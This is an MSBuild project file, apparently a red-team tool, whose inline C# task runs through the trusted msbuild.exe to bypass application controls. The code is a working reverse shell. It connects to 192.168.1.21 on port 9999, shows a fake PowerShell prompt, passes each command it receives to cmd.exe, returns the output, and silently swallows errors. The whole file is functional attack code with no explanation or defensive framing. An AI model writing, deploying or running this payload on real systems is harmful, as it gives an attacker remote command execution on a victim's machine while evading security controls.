<?xml version="1.0" encoding="UTF-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="RedTeam">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Net.Sockets;
        using System.Text;
        using System.IO;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ClassExample : Task, ITask
        {
          public override bool Execute()
          {
            try
            {
              TcpClient client = new TcpClient("192.168.1.21", 9999);
              NetworkStream stream = client.GetStream();
              StreamReader reader = new StreamReader(stream);
              StreamWriter writer = new StreamWriter(stream);
              
              while(true)
              {
                writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
                writer.Flush();
                
                string cmd = reader.ReadLine();
                if(cmd == "exit") break;
                
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/c " + cmd;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.Start();
                
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                writer.Write(output + error);
                writer.Flush();
              }
              
              client.Close();
            }
            catch{ }
            
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>